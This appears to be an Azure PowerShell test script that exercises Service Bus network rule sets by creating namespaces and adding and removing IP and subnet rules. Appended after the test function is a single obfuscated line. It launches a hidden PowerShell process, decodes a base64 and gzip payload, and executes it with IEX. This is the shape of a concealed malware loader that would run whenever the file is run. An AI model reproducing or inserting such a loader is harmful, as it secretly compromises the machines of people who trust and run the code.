















function NetworkRuleSetTests {
    

    $location = Get-Location
    $resourceGroupName = getAssetName "RSG"
    $namespaceName = getAssetName "ServiceBus-Namespace-"
    $namespaceName2 = getAssetName "ServiceBus-Namespace2-"	
	
    
    
    New-AzResourceGroup -Name $resourceGroupName -Location $location -Force	 
	
    

    $checkNameResult = Test-AzServiceBusName -Namespace $namespaceName 
    Assert-True { $checkNameResult.NameAvailable }	
     
    Write-Debug " Create new ServiceBus namespace"
    Write-Debug "NamespaceName : $namespaceName" 
    $result = New-AzServiceBusNamespace -ResourceGroup $resourceGroupName -Name $namespaceName -Location $location -SkuName "Premium"
	
    
    Assert-AreEqual $result.ProvisioningState "Succeeded"

    Write-Debug "Get the created namespace within the resource group"
    $createdNamespace = Get-AzServiceBusNamespace -ResourceGroup $resourceGroupName -Name $namespaceName

    Assert-AreEqual $createdNamespace.Name $namespaceName "Namespace created earlier is not found."	  

    Write-Debug " Create new ServiceBus namespace"
    Write-Debug "NamespaceName : $namespaceName2" 
    $resultNS = New-AzServiceBusNamespace -ResourceGroup $resourceGroupName -Name $namespaceName2 -Location $location -SkuName "Premium"
	
    
    Assert-AreEqual $resultNS.ProvisioningState "Succeeded"

    Write-Debug "Get the created namespace within the resource group"
    $createdNamespace2 = Get-AzServiceBusNamespace -ResourceGroup $resourceGroupName -Name $namespaceName2
    Assert-AreEqual $createdNamespace2.Name $namespaceName2 "Namespace created earlier is not found."	 
    
    Write-Debug "Add a new IPRule to the default NetwrokRuleSet"
    $result = Add-AzServiceBusIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "1.1.1.1" -Action "Allow"

    Write-Debug "Add a new IPRule to the default NetwrokRuleSet"
    $result = Add-AzServiceBusIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "2.2.2.2" -Action "Allow"

    Write-Debug "Add a new IPRule to the default NetwrokRuleSet"
    $result = Add-AzServiceBusIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "3.3.3.3"

    Write-Debug "Add a new VirtualNetworkRule to the default NetwrokRuleSet"
    $result = Add-AzServiceBusVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/default"
    $result = Add-AzServiceBusVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/sbdefault"
    $result = Add-AzServiceBusVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/sbdefault01"

    Write-Debug "Get NetwrokRuleSet"
    $getResult1 = Get-AzServiceBusNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName
	
    Assert-AreEqual $getResult1.VirtualNetworkRules.Count 3 "VirtualNetworkRules count did not matched"
    Assert-AreEqual $getResult1.IpRules.Count 3 "IPRules count did not matched"

    Write-Debug "Remove a new IPRule to the default NetwrokRuleSet"
    $result = Remove-AzServiceBusIPRule -ResourceGroup $resourceGroupName -Name $namespaceName -IpMask "3.3.3.3"	

    $getResult = Get-AzServiceBusNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName

    Assert-AreEqual $getResult.IpRules.Count 2 "IPRules count did not matched after deleting one IPRule"
    Assert-AreEqual $getResult.VirtualNetworkRules.Count 3 "VirtualNetworkRules count did not matched"

    
    $setResult = Set-AzServiceBusNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName2 -InputObject $getResult1
    Assert-AreEqual $setResult.VirtualNetworkRules.Count 3 "Set -VirtualNetworkRules count did not matched"
    Assert-AreEqual $setResult.IpRules.Count 3 "Set - IPRules count did not matched"

    
    $setResult1 = Set-AzServiceBusNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName2 -ResourceId $getResult.Id
    Assert-AreEqual $setResult1.IpRules.Count 2 "Set1 - IPRules count did not matched after deleting one IPRule"
    Assert-AreEqual $setResult1.VirtualNetworkRules.Count 3 "Set1 - VirtualNetworkRules count did not matched"

    Write-Debug "Add a new VirtualNetworkRule to the default NetwrokRuleSet"
    $result = Remove-AzServiceBusVirtualNetworkRule -ResourceGroup $resourceGroupName -Name $namespaceName -SubnetId "/subscriptions/854d368f-1828-428f-8f3c-f2affa9b2f7d/resourcegroups/v-ajnavtest/providers/Microsoft.Network/virtualNetworks/sbehvnettest1/subnets/default"
	
    Write-Debug "Delete NetwrokRuleSet"
    $result = Remove-AzServiceBusNetworkRuleSet -ResourceGroup $resourceGroupName -Name $namespaceName   

    Write-Debug " Delete namespaces"    
    Remove-AzServiceBusNamespace -ResourceGroup $resourceGroupName -Name $namespaceName

    Write-Debug " Delete resourcegroup"
    Remove-AzResourceGroup -Name $resourceGroupName -Force
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGMmBFgCA71WbW/aSBD+nEr9D1aFZFt1MBDSpJEq3RrzlvAaBxNC0Wljr83C2kvsNW+9/vcbA06omtz1+uEskHd3ZnZnn3lmxl4SOoLyUIrwhWdYhWunLn17/+6khyMcSEpuu62V6ufdcPV0udakHO5M65t4rp6cgE6OxbMZLq7MvvRFUsZosTB5gGk4ubqqJFFEQrGf5+tEoDgmwSOjJFZU6S9pOCUROe0+zogjpG9S7s98nfFHzA5qmwp2pkQ6RaGbylrcwamTeWvBqFDkr19ldXxanOSrTwlmsSJbm1iQIO8yJqvSdzU98G6zIIrcpk7EY+6J/JCGZ6X8IIyxRzqw25K0iZhyN5ZVuAr8IiKSKJReLpXustdRZBj2Iu4g141IDCb5Zrjkc6LkwoQxTfpDGR9cuE1CQQMCckEivrBItKQOifMNHLqM3BJvonTIKrv5rxopx0ag1RORqkF03vK1zd2Ekb25rP7s7Q9hVeE5Ci3A8f39u/fvvIwZ4YYeUwJGJ+PdmIC3So/HdKf2RSpoUhuOxIJHG5jm7qKEqBNpnIZiPJlIOS8adLW37YuZMqiKbe+CJF1YHducuhOwOsQpFzQ3y+6yM0xlb3POJB4NibkJcUCdjFbKa+ATj5HdTfOZWgd8U+SDgLgmYcTHIkVSk8Y/m1UDKp5tjYQyl0TIgQDG4BXEVv3RmX1wFLkZtkkAUO3nMoTAAzKTTPtA4E12ejoHJbnCcBxrUi+BbHI0ySKYEVeTUBjTgwglgu+G8ou77YQJ6uBYZNtN1GMsD2dWeBiLKHEggnD/O2tBHIpZCocmNahLjI1F/exs+VUwKpgxGvqw0xKCASspCJZIeRG52p4Dat4iohksGAlAZ5faNYZ9SORDJuyIhH3iyq95mRF9z+oUkwyMIx8h0BbjQpNsGgmoEim+B1L9nhdHJeLZn0pEDpFRsrQZGxuRsj3n8kXXSDl6wGiHSCQAjVrEAwPH5FPZEhFgpXzQu7SC4Bk1Q9Z2jDktohUtNtvwH9CzJjcv3JvrWUOPzPXUQ8242W70zH6jUV5eW3ZZWNWmuOk1Rbt6P5tZqHE7GImHJmrc0cJ8VN4urunWaiF3tNY/bY3tqmCstzPf9Uam5/kXnnVbPK/R1rDSNwol3DKrSWtorIxCOa7SVaNPB/35dU08jmyGB57u3xc/Y7puRTO7yNvbJkL16Zmzvfbs+rTtbkYN/fOwPEdVhCph1a4Z/GZkRKin29i3+erGN4zAryCj5lDy0B/UjH6/ZqBBffZkftZ9sL3HU2Nol+jD4v52CvMauHCjF8pNl2z5qA8g1TnC/i3o+JWSM/VAx/yIjI8dHpfw3ODIAJ3awxP4NVrUegzkd4MSRzbr3GPUetjUdL046pVRo0CHdR+lW2Lf6GMUL82tqRdtl7vD887I0+17dqGblbuF4+m6vmqYN85DcX3ZvbhsDakdcDTQdftDSg5gRy7ouAPzrHcU8rfqehtH8RQzoALU6iwhazyqHUpuj9PUQlGOmvKcRCFh0MKgyWWcRoxxJ20EaYmGHrTvDBPIywEMz0qvjlTpWVF9aQ3Z0tXVA7gKGbKjb75FQl9MtcL6rFCA8l5Ylwtw3V+/X4UvNsp+Ly3tDxlIzwew3QFqmjm5ZGFfLoP/A79D3k7h5f4Lfi9r/yD9JUwL2vPtf5L8uPCfIP5NCIaYCtC3oP4wsu+IryJxIM3RR8Q+TMAJ7/CkH3TdRJx24Ovib4wzsJlQCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

